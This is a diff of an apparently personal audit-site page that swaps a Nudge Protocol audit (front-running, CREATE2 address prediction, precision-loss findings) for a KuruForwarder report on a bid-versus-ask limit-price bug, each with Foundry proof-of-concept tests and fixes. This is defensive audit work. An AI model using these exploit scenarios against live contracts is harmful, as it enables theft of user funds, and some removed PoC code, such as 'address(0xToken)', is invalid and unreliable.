@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Nudge Protocol Audit</title>
+    <title>Kuru Protocol Audit</title>
     <link rel="stylesheet" href="/assets/css/style.css">
     <style>
         /* --- FONTS --- */
@@ -287,7 +287,7 @@
                 <a href="/audits">Audits</a>
                 <a href="/projects">Projects</a>
                 <a href="/contact">Contact</a>
-                <a href="/tags">Tags</a>
+                <!-- <a href="/tags">Tags</a> -->
             </nav>
 
 
@@ -321,294 +321,306 @@
     </header>
 
     <main>
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+        <h1 id="kuruforwarder--price-dependent-execution-logic-vulnerability">KuruForwarder — Price-Dependent Execution Logic Vulnerability</h1>
 
-  <header class="post-header">
-    <h1 class="post-title p-name" itemprop="name headline">Nudge Protocol Audit</h1>
-    <p class="post-meta">
-      <time class="dt-published" datetime="2025-07-25T00:00:00+00:00" itemprop="datePublished">Jul 25, 2025
-      </time></p>
-  </header>
+<h2 id="summary">Summary</h2>
+<p>The <code class="language-plaintext highlighter-rouge">executePriceDependent</code> function in <strong>KuruForwarder</strong> mistakenly uses the <strong>bid price</strong> for both buy and sell validations, instead of using the <strong>ask price for buys</strong>.<br />
+This flaw allows “limit” orders to execute even when prices exceed user-defined thresholds, leading to <strong>unexpected and financially disadvantageous trades</strong>.</p>
 
-  <div class="post-content e-content" itemprop="articleBody">
-    <p><strong>Nudge Protocol Audit  Audit by SCATERLABs</strong></p>
+<h2 id="finding-description">Finding Description</h2>
 
-<p><em>participated in code4rena</em></p>
+<p>In <code class="language-plaintext highlighter-rouge">executePriceDependent</code>, the validation logic reads:</p>
 
-<hr />
-
-<h2 id="1-front-running-attack-in-handlereallocation">1. Front Running Attack in <code class="language-plaintext highlighter-rouge">handleReallocation</code></h2>
-
-<h3 id="description-">Description :</h3>
-<p>A front-running attack occurs when an attacker observes a pending transaction and submits a higher gas fee transaction to execute before the original. This can allow them to manipulate token swaps or reward distributions unfairly.</p>
-
-<h3 id="severity-medium">Severity: Medium</h3>
-
-<h3 id="impact">Impact</h3>
-<ul>
-  <li>Attackers can gain more rewards than intended.</li>
-  <li>Users may receive fewer rewards or lose funds.</li>
-</ul>
-
-<h3 id="proof-of-concept-poc">Proof of Concept (POC)</h3>
-
-<p><strong>Vulnerable Code:</strong></p>
-
-<pre><code class="language-solidity">function handleReallocation(
-    uint256 campaignId_,
-    address userAddress,
-    address toToken,
-    uint256 toAmount,
-    bytes memory data
-)
-    external
-    payable
-    whenNotPaused
-{
-    _validateAndActivateCampaignIfReady();
-    if (!factory.hasRole(factory.SWAP_CALLER_ROLE(), msg.sender)) {
-        revert UnauthorizedSwapCaller();
-    }
-    if (toToken != targetToken) {
-        revert InvalidToTokenReceived(toToken);
-    }
-    if (campaignId_ != campaignId) {
-        revert InvalidCampaignId();
-    }
-
-    uint256 amountReceived;
-    if (toToken == NATIVE_TOKEN) {
-        amountReceived = msg.value;
-    } else {
-        IERC20 tokenReceived = IERC20(toToken);
-        uint256 balanceBefore = getBalanceOfSelf(toToken);
-        SafeERC20.safeTransferFrom(tokenReceived, msg.sender, address(this), toAmount);
-        amountReceived = getBalanceOfSelf(toToken) - balanceBefore;
-    }
-
-    _transfer(toToken, userAddress, amountReceived);
-    totalReallocatedAmount += amountReceived;
-    uint256 rewardAmountIncludingFees = getRewardAmountIncludingFees(amountReceived);
-    uint256 rewardsAvailable = claimableRewardAmount();
-    if (rewardAmountIncludingFees &gt; rewardsAvailable) {
-        revert NotEnoughRewardsAvailable();
-    }
-
-    (uint256 userRewards, uint256 fees) = calculateUserRewardsAndFees(rewardAmountIncludingFees);
-    pendingRewards += userRewards;
-    accumulatedFees += fees;
-}
-</code></pre>
-
-<p><strong>Exploit Scenario:</strong></p>
-
-<ol>
-  <li>User A submits a transaction to reallocate tokens and receive rewards.</li>
-  <li>Attacker observes the transaction in the mempool.</li>
-  <li>Attacker submits a similar transaction with a higher gas fee.</li>
-  <li>Attacker drains the available rewards, leaving User A with nothing.</li>
-</ol>
-
-<p><strong>Foundry Test (POC):</strong></p>
-
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
-
-import "forge-std/Test.sol";
-import "src/YourContract.sol";
-
-contract FrontRunningAttackTest is Test {
-    YourContract public contractInstance;
-    address attacker = address(0x1);
-    address victim = address(0x2);
-    
-    function setUp() public {
-        contractInstance = new YourContract();
-    }
-    
-    function testFrontRunning() public {
-        vm.startPrank(victim);
-        contractInstance.handleReallocation(1, victim, address(0xToken), 100, "");
-        vm.stopPrank();
-
-        vm.startPrank(attacker);
-        contractInstance.handleReallocation(1, attacker, address(0xToken), 200, "");
-        vm.stopPrank();
-
-        uint256 rewards = contractInstance.claimableRewardAmount();
-        assertEq(rewards, 0, "Victim received no rewards due to front-running.");
-    }
-}
-</code></pre>
-
-<h3 id="recommended-mitigations">Recommended Mitigations</h3>
-
-<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">1.</span> Use a commit-reveal scheme: Prevent front-running by making users commit to inputs before revealing.
-<span class="p">2.</span> Implement gas price caps: Prevent transactions from cutting the queue based on gas price.
-<span class="p">3.</span> Batch process transactions: Handle all inputs fairly in a single round.
-</code></pre></div></div>
-
-<hr />
-
-<h2 id="2-create2-address-prediction-attack">2. CREATE2 Address Prediction Attack</h2>
-
-<h3 id="description">Description</h3>
-<p>Contracts using <code class="language-plaintext highlighter-rouge">CREATE2</code> with predictable salts can be precomputed by attackers. Malicious contracts can be deployed to hijack funds sent to the expected address.</p>
-
-<h3 id="severity-high">Severity: High</h3>
-
-<h3 id="impact-1">Impact</h3>
-<ul>
-  <li>Attacker receives all initial reward funds.</li>
-  <li>Campaign contract deployment fails.</li>
-  <li>Total loss of campaign funds.</li>
-</ul>
-
-<h3 id="proof-of-concept-poc-1">Proof of Concept (POC)</h3>
-
-<p><strong>Vulnerable Code:</strong></p>
-
-<pre><code class="language-solidity">bytes32 salt = keccak256(
-    abi.encode(
-        holdingPeriodInSeconds,
-        targetToken,
-        rewardToken,
-        rewardPPQ,
-        campaignAdmin,
-        startTimestamp,
-        FEE_BPS,
-        alternativeWithdrawalAddress,
-        uuid
-    )
+<pre><code class="language-solidity">(uint256 currentBidPrice,) = IOrderBook(req.market).bestBidAsk();
+require(
+    (req.isBelowPrice &amp;&amp; req.price &lt; currentBidPrice) ||
+    (!req.isBelowPrice &amp;&amp; req.price &gt; currentBidPrice),
+    PriceDependentRequestFailed(currentBidPrice, req.price)
 );
-
-bytes memory bytecode = abi.encodePacked(type(NudgeCampaign).creationCode, constructorArgs);
-campaign = Create2.deploy(0, salt, bytecode);
 </code></pre>
 
-<p><strong>Exploit Scenario:</strong></p>
+<h3 id="this-logic-is-erroneous-because">This logic is erroneous because:</h3>
 
-<ol>
-  <li>Attacker precomputes the deployment address.</li>
-  <li>Attacker deploys malicious contract using the same salt.</li>
-  <li>Funds meant for the legitimate campaign are sent to the malicious contract.</li>
-  <li>Attacker withdraws and self-destructs.</li>
-</ol>
-
-<p><strong>Foundry Test:</strong></p>
-
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.19;
-import "forge-std/Test.sol";
-import "src/NudgeFactory.sol";
-import "src/NudgeCampaign.sol";
-
-contract Create2AttackTest is Test {
-    NudgeFactory factory;
-    address attacker;
-
-    function setUp() public {
-        factory = new NudgeFactory();
-        attacker = vm.addr(1);
-    }
-
-    function testCreate2Attack() public {
-        bytes32 salt = keccak256(abi.encode(3600, address(0x123), address(0x456), 1000, attacker, block.timestamp, 500, address(0x789), 1234));
-        address predicted = computeCreate2Address(salt, type(NudgeCampaign).creationCode, address(factory));
-        
-        vm.prank(attacker);
-        new MaliciousContract{salt: salt}();
-        
-        vm.expectRevert();
-        factory.deployAndFundCampaign(3600, address(0x123), address(0x456), 1000, attacker, block.timestamp, address(0x789), 1 ether, 1234);
-    }
-
-    function computeCreate2Address(bytes32 salt, bytes memory bytecode, address deployer) internal pure returns (address) {
-        return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), deployer, salt, keccak256(bytecode))))));
-    }
-}
-
-contract MaliciousContract {
-    receive() external payable {}
-}
-</code></pre>
-
-<h3 id="recommended-mitigations-1">Recommended Mitigations</h3>
-
-<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">1.</span> Use non-predictable salt:
-<span class="p">   -</span> Include randomness like blockhash or a nonce.
-<span class="p">2.</span> Check if address is already occupied:
-<span class="p">   -</span> Use <span class="sb">`isContract()`</span> to validate before deployment.
-
-   require(!isContract(predictedAddress), "Address already occupied");
-<span class="p">   
-
-3.</span> Deploy first, fund later:
-<span class="p">   -</span> Ensure contract was created successfully before transferring funds.
-</code></pre></div></div>
-<hr />
-
-<h2 id="3-precision-loss-due-to-integer-division">3. Precision Loss Due to Integer Division</h2>
-
-<h3 id="description-1">Description</h3>
-<p>Integer division in reward calculation can cause truncation, leading to small but cumulative precision losses.</p>
-
-<p><strong>Vulnerable Code:</strong></p>
-
-<pre><code class="language-solidity">uint256 finalReward = (rewardAmountIn18Decimals + rewardScalingFactor - 1) / rewardScalingFactor;
-</code></pre>
-
-<h3 id="severity-medium-1">Severity: Medium</h3>
-
-<h3 id="impact-2">Impact</h3>
 <ul>
-  <li>Users receive slightly fewer rewards</li>
-  <li>Accumulated loss over multiple users</li>
-  <li>Inconsistent reward distribution</li>
+  <li><strong>Buy orders</strong> (<code class="language-plaintext highlighter-rouge">isBelowPrice = true</code>) should validate against the <strong>ask (lowest seller price)</strong>, not the bid (highest buyer price).</li>
 </ul>
 
-<h3 id="proof-of-concept-poc-2">Proof of Concept (POC)</h3>
+<h3 id="the-correct-logic-must-be">The correct logic must be:</h3>
+
+<ul>
+  <li><strong>a. Buy:</strong> ask ≤ req.price</li>
+  <li><strong>b. Sell:</strong> bid ≥ req.price</li>
+</ul>
+
+<h3 id="why-this-breaks-protocol-guarantees">Why this breaks protocol guarantees</h3>
+
+<p>Users expect their price-dependent requests to execute only within their limit prices.
+The present bug allows trades at <strong>worse prices</strong>, violating that guarantee and compromising user trust.</p>
+
+<h2 id="impact-explanation">Impact Explanation</h2>
+
+<p><strong>Severity:</strong> High</p>
+
+<ul>
+  <li><strong>Financial Loss:</strong> Users might unintentionally pay higher prices when buying or receive less when selling, directly impacting capital.</li>
+  <li><strong>Trust Erosion:</strong> Violates basic trading expectations; users can lose confidence in the system.</li>
+  <li><strong>Predictable Abuse:</strong> Given normal spread conditions, attackers or MEV actors can reliably trigger unfavorable executions.</li>
+</ul>
+
+<h2 id="likelihood-explanation">Likelihood Explanation</h2>
+
+<p><strong>Likelihood:</strong> High</p>
+
+<ul>
+  <li>The faulty logic applies to every <code class="language-plaintext highlighter-rouge">executePriceDependent</code> call.</li>
+  <li>No special conditions or edge cases are required; regular limit-type requests are impacted.</li>
+  <li>Any market with a bid–ask spread where ask &gt; bid &gt; userLimit enables exploitation.</li>
+</ul>
+
+<h2 id="math-whats-wrong-vs-correct">Math: What’s Wrong vs. Correct</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Scenario</strong></th>
+      <th><strong>Bid Price</strong></th>
+      <th><strong>Ask Price</strong></th>
+      <th><strong>User Limit</strong></th>
+      <th><strong>Incorrect Check</strong></th>
+      <th><strong>Result (Bug)</strong></th>
+      <th><strong>Correct Check</strong></th>
+      <th><strong>Expected Behavior</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Buy if price &lt; L</td>
+      <td>2010</td>
+      <td>2020</td>
+      <td>2000</td>
+      <td>2000 &lt; 2010 (true)</td>
+      <td>Executes</td>
+      <td>2020 ≤ 2000 (false)</td>
+      <td>Should not execute</td>
+    </tr>
+    <tr>
+      <td>Sell if price &gt; L</td>
+      <td>2010</td>
+      <td>2020</td>
+      <td>2100</td>
+      <td>2100 &gt; 2010 (true)</td>
+      <td>Executes</td>
+      <td>2010 ≥ 2100 (false)</td>
+      <td>Should not execute</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>In both buy and sell cases, using the <strong>bid</strong> for validation leads to <strong>false positives</strong>.</p>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p><strong>Test Case:</strong> test/PriceDependentBug.t.sol</p>
+
+<blockquote>
+  <p>It is a runnable PoC. You can verify the test case results below.</p>
+</blockquote>
 
 <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.28;
+pragma solidity ^0.8.20;
 
-import "forge-std/Test.sol";
+import {Test, console2 as console} from "forge-std/Test.sol";
+import {KuruForwarder} from "../contracts/KuruForwarder.sol";
+import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 
-contract PrecisionLossTest is Test {
-    function testPrecisionLoss() public {
-        uint256 rewardAmountIn18Decimals = 1005;
-        uint256 rewardScalingFactor = 100;
-        
-        uint256 finalReward = (rewardAmountIn18Decimals + rewardScalingFactor - 1) / rewardScalingFactor;
-        
-        assertEq(finalReward, 11, "Precision loss detected"); // Expected 11, may be 10 without rounding
+/// @notice Minimal mock orderbook used only for this PoC
+contract MockOrderBook {
+    uint256 private bid;
+    uint256 private ask;
+
+    /// @dev set simulated bid / ask (use same units the contract expects)
+    function setPrices(uint256 _bid, uint256 _ask) external {
+        bid = _bid;
+        ask = _ask;
+    }
+
+    /// @notice return best bid and best ask
+    function bestBidAsk() external view returns (uint256, uint256) {
+        return (bid, ask);
+    }
+
+    /// @notice helpers for logging in test
+    function bidPrice() external view returns (uint256) {
+        return bid;
+    }
+
+    function askPrice() external view returns (uint256) {
+        return ask;
+    }
+
+    /// @dev dummy callable function that accepts the appended `from` address
+    /// KuruForwarder calls target with calldata: selector + req.data + req.from
+    function noOp( /*from*/) external {
+        // intentionally empty
+    }
+}
+
+contract PriceDependentBugTest is Test {
+    KuruForwarder forwarder;
+    MockOrderBook orderBook;
+
+    uint256 userPrivateKey = 0x123456;
+    address user;
+
+    function setUp() public {
+        // Deploy mock orderbook
+        orderBook = new MockOrderBook();
+
+        // Prepare allowed selectors array (length 1)
+        bytes4[1] memory selectors;
+        selectors[0] = MockOrderBook.noOp.selector;
+
+        // Deploy forwarder implementation and proxy, initialize with selectors
+        KuruForwarder implementation = new KuruForwarder();
+        bytes memory initData = abi.encodeWithSelector(
+            KuruForwarder.initialize.selector,
+            address(this), // owner
+            selectors
+        );
+        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), initData);
+        forwarder = KuruForwarder(address(proxy));
+
+        // test user funded
+        user = vm.addr(userPrivateKey);
+        vm.deal(user, 1 ether);
+    }
+
+    function testBug_executePriceDependent() public {
+        // 1) Set book: bid = 2010, ask = 2020 (use 1e18 units for clarity)
+        orderBook.setPrices(2010e18, 2020e18);
+
+        // 2) Build PriceDependentRequest: user wants to BUY only if price &lt; 2000
+        KuruForwarder.PriceDependentRequest memory req = KuruForwarder.PriceDependentRequest({
+            from: user,
+            market: address(orderBook),
+            price: 2000e18,
+            value: 0,
+            nonce: 1,
+            deadline: block.timestamp + 1000,
+            isBelowPrice: true, // buy when below price
+            selector: MockOrderBook.noOp.selector,
+            data: "" // no extra data; forwarder will append req.from
+        });
+
+        // 3) Sign the typed-data digest with vm.sign (EIP-712 digest computed below)
+        bytes32 digest = _getDigest(req);
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // Logging
+        console.log("=== BUG DEMO ===");
+        console.log("bid:", orderBook.bidPrice() / 1e18);
+        console.log("ask:", orderBook.askPrice() / 1e18);
+        console.log("user limit:", req.price / 1e18);
+        console.log("isBelowPrice:", req.isBelowPrice ? 1 : 0);
+
+        // 4) Execute on the forwarder (this uses the buggy logic in the version you provided)
+        forwarder.executePriceDependent(req, signature);
+
+        // 5) Check the mismatch: current buggy check uses bid; correct check uses ask
+        (uint256 bid, uint256 ask) = orderBook.bestBidAsk();
+
+        // forwarder current logic (bug): req.price &lt; bid  =&gt; executes
+        bool executedWithBug = (req.isBelowPrice &amp;&amp; req.price &lt; bid);
+
+        // expected (correct) logic: ask &lt;= req.price  =&gt; should execute only if ask &lt;= price
+        // Here we test shouldExecute == false (ask &gt; user limit)
+        bool shouldExecute = (req.isBelowPrice &amp;&amp; ask &lt;= req.price);
+
+        // Assert: the buggy logic evaluates to true but the correct logic is false.
+        assertTrue(executedWithBug &amp;&amp; !shouldExecute, "BUG NOT REPRODUCED: expected buggy execution but it didn't happen");
+    }
+
+    /// @dev Build the EIP-712 digest to match the forwarder's verifyPriceDependent encoding
+    function _getDigest(KuruForwarder.PriceDependentRequest memory req) internal view returns (bytes32) {
+        bytes32 typeHash = keccak256(
+            "PriceDependentRequest(address from,address market,uint256 price,uint256 value,uint256 nonce,uint256 deadline,bool isBelowPrice,bytes4 selector,bytes data)"
+        );
+
+        bytes32 dataHash = keccak256(abi.encode(
+            typeHash,
+            req.from,
+            req.market,
+            req.price,
+            req.value,
+            req.nonce,
+            req.deadline,
+            req.isBelowPrice,
+            req.selector,
+            keccak256(req.data)
+        ));
+
+        bytes32 domainSeparator = keccak256(abi.encode(
+            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
+            keccak256(bytes("KuruForwarder")),
+            keccak256(bytes("1.0.0")),
+            block.chainid,
+            address(forwarder)
+        ));
+
+        return keccak256(abi.encodePacked("\x19\x01", domainSeparator, dataHash));
     }
 }
 </code></pre>
 
-<h3 id="recommended-mitigations-2">Recommended Mitigations</h3>
+<h2 id="test-case-results">Test Case Results</h2>
 
-<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">1.</span> Use higher precision arithmetic:
-<span class="p">   -</span> Avoid truncation by multiplying first, dividing later.
-<span class="p">2.</span> Use <span class="sb">`Math.mulDiv()`</span> from OpenZeppelin:
-<span class="p">   -</span> Offers full-precision multiplication followed by division.
-<span class="p">3.</span> Use fixed-point math:
-<span class="p">   -</span> Store values in 18 decimals and round only when withdrawing.
-<span class="p">4.</span> Consider off-chain computation:
-<span class="p">   -</span> Move reward logic off-chain and just store outcome on-chain.
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nithin@ScateR:~/SCATERLABs/Auditing/kuru-contracts<span class="nv">$ </span>forge <span class="nb">test</span> <span class="nt">--match-test</span> testBug_executePriceDependent <span class="nt">-vvvv</span>
+<span class="o">[</span>⠊] Compiling...
+<span class="o">[</span>⠊] Compiling 1 files with Solc 0.8.29
+<span class="o">[</span>⠒] Solc 0.8.29 finished <span class="k">in </span>2.91s
+Compiler run successful!
+
+Ran 1 <span class="nb">test </span><span class="k">for </span><span class="nb">test</span>/PriceDependentBug.t.sol:PriceDependentBugTest
+<span class="o">[</span>PASS] testBug_executePriceDependent<span class="o">()</span> <span class="o">(</span>gas: 112683<span class="o">)</span>
+Logs:
+  <span class="o">===</span> BUG DEMO <span class="o">===</span>
+  bid: 2010
+  ask: 2020
+  user limit: 2000
+  isBelowPrice: 1
+
+Suite result: ok. 1 passed<span class="p">;</span> 0 failed<span class="p">;</span> 0 skipped<span class="p">;</span> finished <span class="k">in </span>2.28ms <span class="o">(</span>1.27ms CPU <span class="nb">time</span><span class="o">)</span>
 </code></pre></div></div>
 
-<hr />
+<p><strong>Result:</strong>
+The test confirms: execution went through even though ask (2020) exceeds user limit (2000).
+The runnable Foundry test <code class="language-plaintext highlighter-rouge">testBug_executePriceDependent()</code> successfully reproduces this behavior.</p>
 
-<p><em>Link:</em>
-<a href="https://github.com/BLOCK-PROGRAMR/NudgeAuditingReport/blob/2f8e819e88937210c4b2b2a527a4a98e83da07e8/ScaterLabsReport.md">View this audit on GitHub</a></p>
+<h2 id="recommendation">Recommendation</h2>
 
-<p><em>downloadPdf:</em>
-<a href="./SCATERLABsReport.pdf">📄 Download Full Audit Report (PDF)</a></p>
+<p>Replace the flawed condition with:</p>
 
+<pre><code class="language-solidity">(uint256 bid, uint256 ask) = IOrderBook(req.market).bestBidAsk();
 
-  </div><a class="u-url" href="/analysis/NudgeProtocol/" hidden></a>
-</article>
+require(
+    (req.isBelowPrice &amp;&amp; ask &lt;= req.price) ||
+    (!req.isBelowPrice &amp;&amp; bid &gt;= req.price),
+    PriceDependentRequestFailed(req.isBelowPrice ? ask : bid, req.price)
+);
+</code></pre>
+
+<h3 id="why-this-fix-works">Why This Fix Works</h3>
+
+<ul>
+  <li>Buys only execute when <strong>ask ≤ user limit</strong> — user never pays more than intended.</li>
+  <li>Sells only execute when <strong>bid ≥ user limit</strong> — user never sells for less than intended.</li>
+  <li>Maintains logical correctness for both order directions.</li>
+</ul>
+
+<p>⚠️ <strong>Immediate Action Required:</strong>
+Fix this <strong>logic vulnerability</strong> to prevent unintended executions and protect user funds.</p>
+
 
     </main>
 
